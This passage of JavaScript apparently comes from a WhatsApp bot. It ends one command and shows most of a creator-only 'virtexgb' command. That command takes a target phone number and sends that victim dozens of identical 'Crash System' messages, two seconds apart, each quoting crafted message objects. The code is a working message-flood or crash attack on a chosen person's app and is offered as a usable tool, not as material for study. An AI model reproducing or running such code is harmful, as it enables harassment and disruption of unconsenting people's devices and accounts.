await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'virtexgb': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
